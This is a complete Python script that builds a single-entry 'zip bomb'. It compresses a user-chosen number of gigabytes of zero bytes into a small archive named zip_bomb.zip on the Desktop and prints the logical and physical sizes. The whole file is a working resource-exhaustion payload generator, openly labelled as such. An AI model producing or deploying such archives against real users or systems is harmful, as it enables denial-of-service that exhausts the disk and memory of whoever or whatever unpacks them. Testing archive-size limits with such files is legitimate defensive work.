import zipfile
import os
import time
from pathlib import Path

def create_zip_bob():
    # 1. Ask for the size (No hardcoded numbers this time)
    user_input = input("Enter how many GB you want the final file to be: ")
    try:
        target_gb = float(user_input)
    except ValueError:
        print("Error: Please enter a number only.")
        return

    # 2. Setup paths
    desktop_path = Path.home() / "Desktop"
    final_zip = desktop_path / "zip_bomb.zip"

    # Exact math: 1024^3 bytes per GB
    total_bytes = int(target_gb * 1024 * 1024 * 1024)
    chunk_size = 1024 * 1024  # 1MB buffer
    
    start_time = time.time()

    print(f"\nCompiling... Target: {target_gb} GB")
    
    try:
        # allowZip64 handles files over 4GB
        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
            
            # This creates the ONE big file inside the zip
            with zf.open('huge_data.txt', 'w', force_zip64=True) as f:
                written = 0
                dummy_data = b'0' * chunk_size
                
                while written < total_bytes:
                    f.write(dummy_data)
                    written += chunk_size
                    
                    # Updates every 1GB so you know it's working
                    if written % (1024 * 1024 * 1024) == 0:
                        print(f"Status: {written // (1024**3)} / {int(target_gb)} GB compressed...")

        end_time = time.time()
        duration = end_time - start_time
        physical_size = os.path.getsize(final_zip) / (1024 * 1024)

        print("\n" + "="*40)
        print(f"ZIP BOB COMPILER SUCCESS")
        print(f"Final File:    {final_zip}")
        print(f"Logical Size:  {target_gb} GB")
        print(f"Physical Size: {physical_size:.2f} MiB")
        print(f"Time Taken:    {duration:.2f} seconds")
        print("="*40)

    except Exception as e:
        print(f"Compiler Error: {e}")

if __name__ == "__main__":
    create_zip_bob()
